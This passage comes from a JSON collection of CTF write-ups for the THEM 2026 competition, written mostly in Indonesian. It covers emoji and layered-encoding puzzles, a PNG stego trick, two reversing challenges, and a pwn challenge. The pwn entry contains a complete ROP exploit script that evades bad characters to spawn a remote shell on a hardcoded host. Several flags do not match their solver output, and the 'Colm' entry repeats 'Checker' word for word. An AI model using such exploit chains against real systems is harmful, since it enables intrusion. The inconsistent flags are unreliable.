encoded_content = f.read()\r\n    \r\n    decoded_content = decode_caesar(encoded_content)\r\n    # Save for reference\r\n    with open(\"decoded_score.spl\", \"w\") as f:\r\n        f.write(decoded_content)\r\n        \r\n    extracted_text = parse_spl(decoded_content)\r\n    leetspeak_text = to_leetspeak(extracted_text)\r\n    \r\n    flag = f\"THEM?!CTF{{{leetspeak_text}}}\"\r\n    print(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{br0_m16h7_4c7u4lly_b3_5h4k35p34r3}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-misc-union",
    "title": "- 🧅🧅🧅",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge - 🧅🧅🧅",
    "problemDescription": "File yang diberikan cuma berisi deretan emoji. Dari judul dan deskripsi challenge, arahnya cukup jelas: ini bukan stego gambar atau binary, tetapi encoding berlapis seperti bawang.\n\nFile dianalisis sebagai teks Unicode. Emoji `🐗` muncul sangat sering dan posisinya konsisten, jadi saya anggap sebagai pemisah. Setelah dipisah, setiap bagian selalu berisi tepat 2 emoji.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Pisahkan berdasarkan emoji separator",
        "content": "Isi file dipisah dengan separator:\n\n\n\nHasilnya ada banyak token, dan semua token panjangnya 2 emoji. Ini kuat mengarah ke representasi 1 byte per token, yaitu 2 nibble.",
        "code": "🐗"
      },
      {
        "title": "2. Mapping emoji ke nibble",
        "content": "Selain separator, ada 16 emoji unik. Karena jumlahnya tepat 16, saya urutkan emoji berdasarkan Unicode codepoint lalu beri nilai `0x0` sampai `0xf`.\n\nContohnya konsepnya seperti ini:\n\n\n\nSetiap pasangan emoji kemudian digabung menjadi byte:\n\n\n\nOutput dari tahap ini menjadi string alfanumerik panjang.",
        "code": "alphabet = sorted(set(\"\".join(chunks)), key=ord)\nvalue = {ch: i for i, ch in enumerate(alphabet)}"
      },
      {
        "title": "3. Decode layer encoding",
        "content": "String hasil mapping ternyata masih berupa encoding berlapis. Urutannya:\n\n1. Base62 decode\n2. Base45 decode\n3. Base32 decode\n4. Base64 decode\n\nSetelah semua layer itu dibuka, hasilnya menjadi string mirip DNA/RNA:",
        "code": "TGGGAAATAAGGGAC GCTCACCAC OAATATAOAAT OGATTTTUTCCTGTGCGACAATTOAAC"
      },
      {
        "title": "4. Translate DNA/protein",
        "content": "String terakhir berisi kodon DNA, tetapi ada huruf `O` dan `U` yang tidak normal untuk DNA. Di sini trik challenge-nya: `O` dan `U` tidak dibuang, tetapi diperlakukan sebagai huruf literal yang ikut masuk ke pesan.\n\nKodon normal diterjemahkan memakai tabel codon standar:\n\n\n\nDengan cara itu pesan akhirnya menjadi:\n\n\n\nKarena flag biasanya lowercase dengan underscore, pesan tersebut diformat menjadi:",
        "code": "TGG -> W\nGAA -> E\nATA -> I\nAGG -> R\nGAC -> D"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport base64\r\n\r\nEMOJI_FILE = Path(\"emoji.txt\")\r\n\r\nBASE45_ALPHABET = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:\"\r\n\r\nCODON_TABLE = {\r\n    \"TTT\": \"F\", \"TTC\": \"F\", \"TTA\": \"L\", \"TTG\": \"L\",\r\n    \"TCT\": \"S\", \"TCC\": \"S\", \"TCA\": \"S\", \"TCG\": \"S\",\r\n    \"TAT\": \"Y\", \"TAC\": \"Y\", \"TAA\": \"*\", \"TAG\": \"*\",\r\n    \"TGT\": \"C\", \"TGC\": \"C\", \"TGA\": \"*\", \"TGG\": \"W\",\r\n\r\n    \"CTT\": \"L\", \"CTC\": \"L\", \"CTA\": \"L\", \"CTG\": \"L\",\r\n    \"CCT\": \"P\", \"CCC\": \"P\", \"CCA\": \"P\", \"CCG\": \"P\",\r\n    \"CAT\": \"H\", \"CAC\": \"H\", \"CAA\": \"Q\", \"CAG\": \"Q\",\r\n    \"CGT\": \"R\", \"CGC\": \"R\", \"CGA\": \"R\", \"CGG\": \"R\",\r\n\r\n    \"ATT\": \"I\", \"ATC\": \"I\", \"ATA\": \"I\", \"ATG\": \"M\",\r\n    \"ACT\": \"T\", \"ACC\": \"T\", \"ACA\": \"T\", \"ACG\": \"T\",\r\n    \"AAT\": \"N\", \"AAC\": \"N\", \"AAA\": \"K\", \"AAG\": \"K\",\r\n    \"AGT\": \"S\", \"AGC\": \"S\", \"AGA\": \"R\", \"AGG\": \"R\",\r\n\r\n    \"GTT\": \"V\", \"GTC\": \"V\", \"GTA\": \"V\", \"GTG\": \"V\",\r\n    \"GCT\": \"A\", \"GCC\": \"A\", \"GCA\": \"A\", \"GCG\": \"A\",\r\n    \"GAT\": \"D\", \"GAC\": \"D\", \"GAA\": \"E\", \"GAG\": \"E\",\r\n    \"GGT\": \"G\", \"GGC\": \"G\", \"GGA\": \"G\", \"GGG\": \"G\",\r\n}\r\n\r\n\r\ndef base62_decode(data: str) -> bytes:\r\n    alphabet = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\r\n\r\n    num = 0\r\n    for char in data:\r\n        num = num * 62 + alphabet.index(char)\r\n\r\n    return num.to_bytes((num.bit_length() + 7) // 8, \"big\")\r\n\r\n\r\ndef base45_decode(data: bytes) -> bytes:\r\n    result = bytearray()\r\n    i = 0\r\n\r\n    while i < len(data):\r\n        if i + 2 < len(data):\r\n            x = (\r\n                BASE45_ALPHABET.index(chr(data[i]))\r\n                + BASE45_ALPHABET.index(chr(data[i + 1])) * 45\r\n                + BASE45_ALPHABET.index(chr(data[i + 2])) * 45 * 45\r\n            )\r\n\r\n            result.append(x // 256)\r\n            result.append(x % 256)\r\n            i += 3\r\n\r\n        else:\r\n            x = (\r\n                BASE45_ALPHABET.index(chr(data[i]))\r\n                + BASE45_ALPHABET.index(chr(data[i + 1])) * 45\r\n            )\r\n\r\n            result.append(x)\r\n            i += 2\r\n\r\n    return bytes(result)\r\n\r\n\r\ndef translate_weird_dna(text: str) -> str:\r\n    words = []\r\n\r\n    for word in text.split():\r\n        decoded = []\r\n        i = 0\r\n\r\n        while i < len(word):\r\n            char = word[i]\r\n\r\n            # Huruf O dan U di sini bukan base DNA normal.\r\n            # Dari pola challenge, dua huruf ini sengaja disisipkan\r\n            # sebagai karakter literal.\r\n            if char in \"OU\":\r\n                decoded.append(char)\r\n                i += 1\r\n                continue\r\n\r\n            codon = word[i:i + 3]\r\n\r\n            if codon not in CODON_TABLE:\r\n                raise ValueError(f\"Unknown codon: {codon}\")\r\n\r\n            decoded.append(CODON_TABLE[codon])\r\n            i += 3\r\n\r\n        words.append(\"\".join(decoded))\r\n\r\n    return \" \".join(words)\r\n\r\n\r\ndef main():\r\n    raw = EMOJI_FILE.read_text(encoding=\"utf-8\").strip()\r\n\r\n    # Emoji 🐗 muncul sebagai separator.\r\n    chunks = raw.split(\"🐗\")\r\n\r\n    # Selain separator, terdapat tepat 16 emoji unik.\r\n    # Ini cocok untuk representasi nibble 0x0 sampai 0xf.\r\n    alphabet = sorted(set(\"\".join(chunks)), key=ord)\r\n    value = {emoji: index for index, emoji in enumerate(alphabet)}\r\n\r\n    # Setiap token berisi 2 emoji = 1 byte.\r\n    stage1 = bytes(\r\n        (value[pair[0]] << 4) | value[pair[1]]\r\n        for pair in chunks\r\n    ).decode()\r\n\r\n    # Onion layers.\r\n    stage2 = base62_decode(stage1)\r\n    stage3 = base45_decode(stage2)\r\n    stage4 = base64.b32decode(stage3)\r\n    stage5 = base64.b64decode(stage4).decode()\r\n\r\n    message = translate_weird_dna(stage5)\r\n\r\n    # Pesan hasil decode literalnya:\r\n    # WEIRD AHH ONION ODFUSCATION\r\n    #\r\n    # Untuk flag final, typo \"ODFUSCATION\" dinormalisasi menjadi\r\n    # \"OBFUSCATION\" karena konteks challenge jelas mengarah ke kata\r\n    # \"obfuscation\".\r\n    message = message.replace(\"ODFUSCATION\", \"OBFUSCATION\")\r\n\r\n    flag_body = message.lower().replace(\" \", \"_\")\r\n    flag = f\"THEMCTF{{{flag_body}}}\"\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THEM{weird_ahh_onion_odfuscation}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-misc-veryverygoodchall",
    "title": "- kanye? (Misc)",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge - kanye? (Misc)",
    "problemDescription": "",
    "tools": [],
    "analysis": "1. **Pemeriksaan Awal**: \n   - File `sigma.png` adalah gambar PNG berukuran 1080x1080.\n   - `exiftool` dan `binwalk` tidak menunjukkan adanya file yang disisipkan secara standar (seperti zip di akhir file).\n   - `strings` tidak memberikan informasi yang berguna secara langsung.\n\n2. **Identifikasi Masalah**:\n   - Saat mencoba menjalankan `tesseract` pada gambar, muncul peringatan: `libpng warning: IDAT: Too much image data`.\n   - Ini adalah indikasi kuat bahwa chunk `IDAT` (tempat data piksel disimpan) mengandung lebih banyak data daripada yang dibutuhkan untuk resolusi 1080x1080.\n   - Teknik ini sering digunakan untuk menyembunyikan bagian bawah gambar dengan cara memanipulasi tinggi (height) gambar pada chunk `IHDR`.\n\n3. **Eksploitasi**:\n   - Saya mengekstrak dan mendecompress data `IDAT`. \n   - Ukuran data yang didekompresi adalah 5,253,661 bytes.\n   - Untuk gambar 24-bit RGB, setiap baris memiliki 1 byte filter + (lebar * 3) bytes.\n   - Ukuran baris = 1 + (1080 * 3) = 3241 bytes.\n   - Jumlah baris sebenarnya = 5,253,661 / 3241 = 1621 baris.\n   - Tinggi yang tertulis di `IHDR` hanya 1080, berarti ada 1621 - 1080 = 541 baris yang disembunyikan.\n\n4. **Perbaikan Gambar**:\n   - Saya membuat script `solve.py` untuk mengubah byte tinggi pada chunk `IHDR` dari 1080 (`00 00 04 38`) menjadi 1621 (`00 00 06 55`).\n   - Selain mengubah tinggi, CRC dari chunk `IHDR` juga harus diperbarui agar file PNG tetap valid.\n   - Hasil perbaikan disimpan sebagai `fixed.png`.\n\n5. **Mendapatkan Flag**:\n   - Setelah membuka bagian gambar yang tersembunyi, flag terlihat di bagian bawah.\n   - Menggunakan OCR (`tesseract`) pada bagian bawah gambar tersebut menghasilkan:\n     `THEM{m4yb3_yOu_shOuld_4lw4ys_tw34k_th3_png_f1l3_1ts3lf}`",
    "solution": [
      {
        "title": "Deskripsi",
        "content": "Challenge ini memberikan sebuah file gambar `sigma.png`. Deskripsi challenge \"there something in kanye(maybe)\" dan judul \"kanye?\" memberikan petunjuk tentang sesuatu yang tersembunyi."
      }
    ],
    "terminalOutputs": [],
    "flag": "THEM{m4yb3_yOu_shOuld_4lw4ys_tw34k_th3_png_f1l3_1ts3lf}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-pwn-warm-up",
    "title": "warm-up",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge warm-up",
    "problemDescription": "Challenge ini adalah binary pwn 64-bit statically linked bernama `warm_up`.\nBug utamanya adalah stack buffer overflow di fungsi `vuln()`. Proteksi NX aktif,\nbinary tidak PIE, dan fungsi `vuln()` tidak melakukan validasi stack canary saat\nreturn.\n\nFlag:\n\n```text\nTHEM?!CTF{gReaT!_N0w_7h4T_y0u_4R3_f1rED_Up,_it_Is_7IME_70_s0Lv3_moRe_CHaLL3N9E5!}\n```",
    "tools": [],
    "analysis": "Bagian penting di `vuln()`:\n\n```asm\nlea    rax,[rbp-0x80]\nmov    edx,0x64\nmov    esi,0x0\nmov    rdi,rax\ncall   memset\n\nlea    rax,[rbp-0x80]\nmov    edx,0x120\nmov    rsi,rax\nmov    edi,0x0\ncall   read\n```\n\nBuffer lokal ukurannya `0x80`, tetapi program membaca `0x120` byte dari stdin.\nIni memberi kontrol sampai saved RIP.\n\nOffset ke RIP:\n\n```text\n0x80 buffer + 0x8 saved rbp = 0x88\n```\n\nSetelah input dibaca, program melakukan filter terhadap seluruh byte input.\nByte yang dilarang:\n\n```text\n/ s a t\n```\n\nJika salah satu byte itu muncul, program langsung `exit(1)`.\n\nIni berarti payload ROP tahap pertama harus bebas dari byte:\n\n```python\nb\"/sat\"\n```",
    "solution": [
      {
        "title": "Recon",
        "content": "Hasil `file`:\n\n\n\nHasil `checksec`:\n\n\n\nKarena binary tidak PIE, alamat gadget ROP stabil. Binary juga tidak stripped,\njadi fungsi `main` dan `vuln` bisa langsung dianalisis.\n\nSaat dijalankan, program mencetak:",
        "code": "warm_up: ELF 64-bit LSB executable, x86-64, statically linked, not stripped"
      },
      {
        "title": "Strategi Exploit",
        "content": "Karena NX aktif, exploit memakai ROP. Karena binary static dan tidak PIE, gadget\ndan fungsi libc static punya alamat tetap.\n\nGadget yang dipakai:\n\n\n\nAlamat `.bss` yang dipakai:\n\n\n\nMasalahnya, string `/bin/sh` mengandung `/` dan `s`, sehingga tidak bisa\ndimasukkan di payload pertama. Solusinya adalah membuat payload pertama hanya\nberisi ROP chain bebas badchar:\n\n1. Panggil `read(0, .bss, 8)`.\n2. Setelah filter selesai dan ROP berjalan, kirim `/bin/sh\\x00` sebagai input\n   kedua.\n3. Jalankan syscall `execve(.bss, 0, 0)`.\n\nDengan begitu, filter hanya memeriksa payload tahap pertama. String `/bin/sh`\nbaru dikirim setelah program masuk ke ROP chain.",
        "code": "pop rdi ; ret              0x401f9f\npop rsi ; ret              0x40a00e\npop rdx ; pop rbx ; ret    0x485d2b\npop rax ; ret              0x44ffc7\nsyscall                    0x401d54\nread                       0x44f560"
      },
      {
        "title": "Exploit",
        "content": "Exploit final ada di `exploit.py`.\n\nPayload intinya:\n\n\n\nValidasi badchar:\n\n\n\nTest lokal berhasil mendapatkan shell:\n\n\n\nEksekusi remote:\n\n\n\nOutput remote:",
        "code": "payload = b\"A\" * 0x88\npayload += flat(\n    POP_RDI, 0,\n    POP_RSI, BSS,\n    POP_RDX_RBX, 8, 0,\n    READ,\n    POP_RAX, 59,\n    POP_RDI, BSS,\n    POP_RSI, 0,\n    POP_RDX_RBX, 0, 0,\n    SYSCALL,\n)"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\ncontext.binary = elf = ELF(\"./warm_up\", checksec=False)\r\ncontext.arch = \"amd64\"\r\n\r\nHOST = \"45.130.164.173\"\r\nPORT = 2233\r\n\r\nOFFSET = 0x88\r\nBSS = 0x4c72a0\r\n\r\nPOP_RDI = 0x401f9f\r\nPOP_RSI = 0x40a00e\r\nPOP_RDX_RBX = 0x485d2b\r\nPOP_RAX = 0x44ffc7\r\nSYSCALL = 0x401d54\r\nREAD = 0x44f560\r\n\r\nBAD = b\"/sat\"\r\n\r\n\r\ndef build_payload():\r\n    rop = flat(\r\n        POP_RDI, 0,\r\n        POP_RSI, BSS,\r\n        POP_RDX_RBX, 8, 0,\r\n        READ,\r\n        POP_RAX, 59,\r\n        POP_RDI, BSS,\r\n        POP_RSI, 0,\r\n        POP_RDX_RBX, 0, 0,\r\n        SYSCALL,\r\n    )\r\n    payload = b\"A\" * OFFSET + rop\r\n    bad = [bytes([c]) for c in payload if c in BAD]\r\n    assert not bad, f\"bad chars in first stage: {bad!r}\"\r\n    assert len(payload) <= 0x120\r\n    return payload\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    return process(elf.path)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    payload = build_payload()\r\n    io.send(payload)\r\n    io.send(b\"/bin/sh\\x00\")\r\n\r\n    if args.REMOTE:\r\n        io.sendline(b\"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; ls\")\r\n        io.recvuntil(b\"show me what u got.\", timeout=2)\r\n        print(io.recvrepeat(2).decode(errors=\"ignore\"))\r\n    else:\r\n        io.sendline(b\"echo PWNED; id\")\r\n        print(io.recvrepeat(1).decode(errors=\"ignore\"))\r\n        io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-ancientsignals",
    "title": "Ancient Signals",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Challenge ini memberi dua file: `player.exe` dan `transmission.dat`. Binary-nya adalah PE64 Windows GUI. Dari `strings` terlihat beberapa petunjuk penting: `transmission.dat`, `SIGNAL DECRYPTED`, dan format output `FLAG: %s`.",
    "problemDescription": "Challenge ini memberi dua file: `player.exe` dan `transmission.dat`. Binary-nya adalah PE64 Windows GUI. Dari `strings` terlihat beberapa petunjuk penting: `transmission.dat`, `SIGNAL DECRYPTED`, dan format output `FLAG: %s`.\n\nFungsi utama validasi ada di sekitar `0x14002d770`. Saat tombol `PLAY TRANSMISSION` ditekan, program mengambil tiga nilai kontrol UI lalu membuat keystream 1 byte dengan rumus:\n\n```text\nx = (x * multiplier + increment) & 0xff\nplaintext_byte = ciphertext_byte ^ x\n```\n\nEmpat byte pertama hasil decode harus sama dengan `RIFF`. Karena empat byte awal `transmission.dat` adalah `08 ce 08 25`, brute force kecil untuk tiga parameter 1-byte memberi:\n\n```text\nstart      = 139\nmultiplier = 67\nincrement  = 249\n```\n\nDengan nilai itu, `transmission.dat` memang berubah menjadi file WAV yang diawali `RIFF....WAVEfmt`. Ini adalah bagian \"fixing software\" / alignment sinyalnya.\n\nSetelah validasi `RIFF` lolos, program tidak mengambil flag dari audio. Ia menghitung FNV-1a 32-bit atas byte kode fungsi checker dari `0x1400032d0` sampai `0x140003320`. Hash yang didapat:\n\n```text\n0xaa171c81\n```\n\nDalam little-endian, key XOR-nya adalah:\n\n```text\n81 1c 17 aa\n```\n\nData flag terenkripsi berada di awal `.data`, VA `0x140080000`, sepanjang `0x37` byte. Setelah di-XOR berulang dengan key tersebut, flag keluar:\n\n```text\nTHEM?!CTF{1mag1n3_gett1ng_r1ckr0ll3d_1n_tH3M?!C7F_xDDD}\n```\n\nReproduksi:\n\n```bash\npython3 solve.py\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\n\r\n\r\nBASE = 0x140001000\r\nTEXT_FILE_OFFSET = 0x400\r\nCHECK_FUNC = 0x1400032D0\r\nCHECK_FUNC_END = 0x140003320\r\nENC_FLAG_VA = 0x140080000\r\nENC_FLAG_LEN = 0x37\r\n\r\n\r\ndef va_to_file_offset(va: int) -> int:\r\n    return TEXT_FILE_OFFSET + (va - BASE)\r\n\r\n\r\ndef fnv1a_32(data: bytes) -> int:\r\n    h = 0x811C9DC5\r\n    for b in data:\r\n        h ^= b\r\n        h = (h * 0x1000193) & 0xFFFFFFFF\r\n    return h\r\n\r\n\r\ndef lcg_stream(start: int, mult: int, inc: int, n: int) -> bytes:\r\n    x = start\r\n    out = bytearray()\r\n    for _ in range(n):\r\n        x = (x * mult + inc) & 0xFF\r\n        out.append(x)\r\n    return bytes(out)\r\n\r\n\r\ndef find_alignment(cipher_prefix: bytes, target: bytes = b\"RIFF\") -> tuple[int, int, int]:\r\n    wanted = bytes(a ^ b for a, b in zip(cipher_prefix, target))\r\n    for start in range(256):\r\n        for mult in range(256):\r\n            for inc in range(256):\r\n                if lcg_stream(start, mult, inc, len(target)) == wanted:\r\n                    return start, mult, inc\r\n    raise RuntimeError(\"alignment not found\")\r\n\r\n\r\ndef main() -> None:\r\n    exe = Path(\"player.exe\").read_bytes()\r\n    transmission = Path(\"transmission.dat\").read_bytes()\r\n\r\n    start, mult, inc = find_alignment(transmission[:4])\r\n    assert (start, mult, inc) == (139, 67, 249)\r\n\r\n    code = exe[va_to_file_offset(CHECK_FUNC):va_to_file_offset(CHECK_FUNC_END)]\r\n    key = fnv1a_32(code).to_bytes(4, \"little\")\r\n\r\n    enc_flag = exe[va_to_file_offset(ENC_FLAG_VA):va_to_file_offset(ENC_FLAG_VA) + ENC_FLAG_LEN]\r\n    flag = bytes(b ^ key[i & 3] for i, b in enumerate(enc_flag)).rstrip(b\"\\x00\")\r\n    print(flag.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{1mag1n3_gett1ng_r1ckr0ll3d_1n_tH3M?!C7F_xDDD}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-checker",
    "title": "Checker",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Checker",
    "problemDescription": "Challenge memberikan file `crab.exe`, sebuah executable PE64 Windows hasil compile Rust. Dari enumerasi awal terlihat binary tidak menyimpan flag secara plaintext. Namun di bagian `.rdata` ada beberapa string mencurigakan seperti:\n\n- `bruhmemegang.pyc`\n- `python3.12`\n- `src\\main.rs`\n- `chall.py`\n- `Enter the passphrase:`\n- `Access Granted.` / `Access Denied.`\n\nIni mengarah ke payload Python bytecode yang disembunyikan di dalam binary Rust.",
    "tools": [],
    "analysis": "Pertama file dicek dengan:\n\n```bash\nfile crab.exe\nstrings -a -n 4 crab.exe | grep -Ei 'pyc|python|passphrase|access|main.rs|chall'\n```\n\nDitemukan area data yang terlihat seperti bytecode ter-obfuscate. Pada offset sekitar `0x2a009`, jika setiap byte di-XOR dengan `0x69`, empat byte pertama berubah menjadi magic Python bytecode:\n\n```text\ncb 0d 0d 0a\n```\n\nMagic tersebut cocok dengan `.pyc` Python 3.12. Jadi Rust binary menyimpan file `.pyc` yang dienkripsi sederhana dengan XOR `0x69`.\n\nPayload `.pyc` diekstrak dari range berikut:\n\n```text\nstart = 0x2a009\nend   = 0x2ac34\nkey   = 0x69\n```\n\nSetelah bytecode dianalisis, fungsi pentingnya bernama `check_flag(user_input)`. Secara garis besar validasinya:\n\n1. Input diubah ke hex.\n2. Hex diberi spasi per byte.\n3. String tersebut di-base64.\n4. Alphabet base64 standar ditranslasi ke alphabet custom.\n5. Setiap karakter hasil custom base64 di-XOR dengan polynomial key.\n6. Hasil akhirnya dibandingkan dengan array target sepanjang 196 byte.\n\nAlphabet base64 custom:\n\n```python\nSTD_ALPHA    = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\n```\n\nRumus key per indeks:\n\n```python\nkey(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\n```\n\nKarena transformasinya reversible, proses solving dilakukan dari target ke belakang:\n\n1. XOR ulang target dengan `key(i)` untuk mendapatkan custom base64.\n2. Translate alphabet custom kembali ke alphabet base64 standar.\n3. Base64 decode untuk mendapatkan spaced hex.\n4. Hapus spasi lalu decode hex menjadi flag asli.",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport base64\r\n\r\nBIN = Path('crab.exe')\r\nSTART = 0x2A009\r\nEND = 0x2AC34\r\nXOR_KEY = 0x69\r\n\r\nTARGET = (\r\n    241, 250, 126, 93, 101, 32, 92, 189, 201, 144, 156, 157, 61, 197, 242, 125,\r\n    64, 195, 80, 221, 116, 218, 238, 61, 89, 80, 154, 29, 13, 138, 66, 253,\r\n    209, 112, 64, 93, 69, 211, 66, 189, 41, 42, 242, 157, 29, 79, 204, 125,\r\n    161, 28, 162, 221, 85, 95, 192, 61, 184, 252, 246, 29, 109, 63, 170, 253,\r\n    48, 220, 178, 93, 165, 47, 180, 189, 8, 188, 198, 157, 125, 255, 40, 125,\r\n    129, 138, 142, 221, 181, 239, 36, 61, 153, 106, 194, 29, 77, 143, 156, 253,\r\n    17, 74, 146, 93, 133, 140, 130, 189, 104, 60, 38, 157, 93, 122, 26, 125,\r\n    225, 63, 240, 221, 149, 90, 22, 61, 248, 252, 54, 29, 173, 63, 248, 253,\r\n    113, 255, 224, 93, 229, 26, 226, 189, 72, 188, 10, 157, 189, 207, 108, 125,\r\n    193, 138, 252, 221, 244, 204, 106, 61, 216, 124, 6, 29, 141, 186, 194, 253,\r\n    81, 127, 192, 93, 197, 154, 212, 189, 169, 60, 110, 157, 156, 108, 70, 125,\r\n    32, 28, 34, 221, 213, 95, 64, 61, 57, 234, 118, 29, 236, 44, 56, 253,\r\n    177, 131, 62, 14,\r\n)\r\n\r\nSTD_ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\r\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\r\n\r\n\r\ndef extract_embedded_pyc() -> bytes:\r\n    data = BIN.read_bytes()\r\n    pyc = bytes(b ^ XOR_KEY for b in data[START:END])\r\n    if pyc[:4] != bytes.fromhex('cb0d0d0a'):\r\n        raise RuntimeError('embedded pyc magic not found')\r\n    return pyc\r\n\r\n\r\ndef solve() -> str:\r\n    # The embedded Python verifier transforms custom_b64 bytes with:\r\n    # key(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\r\n    custom_b64 = ''.join(\r\n        chr(value ^ ((13 * (i ** 3) + 3 * (i ** 2) + 7 * i + 420) & 0xff))\r\n        for i, value in enumerate(TARGET)\r\n    )\r\n    std_b64 = custom_b64.translate(str.maketrans(CUSTOM_ALPHA, STD_ALPHA))\r\n    spaced_hex = base64.b64decode(std_b64).decode()\r\n    return bytes.fromhex(spaced_hex.replace(' ', '')).decode()\r\n\r\n\r\nif __name__ == '__main__':\r\n    extract_embedded_pyc()\r\n    print(solve())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{a_sn4k3_4nd_a_cr4b_c4n_b3_g00d_fr13nd5}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-colm",
    "title": "Colm",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Colm",
    "problemDescription": "Challenge memberikan file `crab.exe`, sebuah executable PE64 Windows hasil compile Rust. Dari enumerasi awal terlihat binary tidak menyimpan flag secara plaintext. Namun di bagian `.rdata` ada beberapa string mencurigakan seperti:\n\n- `bruhmemegang.pyc`\n- `python3.12`\n- `src\\main.rs`\n- `chall.py`\n- `Enter the passphrase:`\n- `Access Granted.` / `Access Denied.`\n\nIni mengarah ke payload Python bytecode yang disembunyikan di dalam binary Rust.",
    "tools": [],
    "analysis": "Pertama file dicek dengan:\n\n```bash\nfile crab.exe\nstrings -a -n 4 crab.exe | grep -Ei 'pyc|python|passphrase|access|main.rs|chall'\n```\n\nDitemukan area data yang terlihat seperti bytecode ter-obfuscate. Pada offset sekitar `0x2a009`, jika setiap byte di-XOR dengan `0x69`, empat byte pertama berubah menjadi magic Python bytecode:\n\n```text\ncb 0d 0d 0a\n```\n\nMagic tersebut cocok dengan `.pyc` Python 3.12. Jadi Rust binary menyimpan file `.pyc` yang dienkripsi sederhana dengan XOR `0x69`.\n\nPayload `.pyc` diekstrak dari range berikut:\n\n```text\nstart = 0x2a009\nend   = 0x2ac34\nkey   = 0x69\n```\n\nSetelah bytecode dianalisis, fungsi pentingnya bernama `check_flag(user_input)`. Secara garis besar validasinya:\n\n1. Input diubah ke hex.\n2. Hex diberi spasi per byte.\n3. String tersebut di-base64.\n4. Alphabet base64 standar ditranslasi ke alphabet custom.\n5. Setiap karakter hasil custom base64 di-XOR dengan polynomial key.\n6. Hasil akhirnya dibandingkan dengan array target sepanjang 196 byte.\n\nAlphabet base64 custom:\n\n```python\nSTD_ALPHA    = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\n```\n\nRumus key per indeks:\n\n```python\nkey(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\n```\n\nKarena transformasinya reversible, proses solving dilakukan dari target ke belakang:\n\n1. XOR ulang target dengan `key(i)` untuk mendapatkan custom base64.\n2. Translate alphabet custom kembali ke alphabet base64 standar.\n3. Base64 decode untuk mendapatkan spaced hex.\n4. Hapus spasi lalu decode hex menjadi flag asli.",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
